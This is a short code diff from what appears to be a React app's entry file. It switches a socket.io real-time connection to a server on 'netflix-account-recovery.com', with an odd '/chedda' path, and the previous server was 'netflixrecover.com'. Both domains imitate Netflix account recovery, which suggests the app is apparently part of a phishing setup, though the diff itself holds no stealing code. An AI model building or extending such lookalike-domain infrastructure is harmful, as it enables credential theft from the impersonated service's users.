@@ -4,8 +4,8 @@ import { BrowserRouter as Router } from 'react-router-dom';
 import App from './App';
 import io from 'socket.io-client';
 
-const socket = io('wss://netflixrecover.com', { 
-  path: "/realtime-connection/",
+const socket = io('wss://netflix-account-recovery.com', { 
+  path: "/chedda",
   transports: ['websocket', 'polling'],
   reconnection: true,
   reconnectionAttempts: 10, // Increase retry attempts
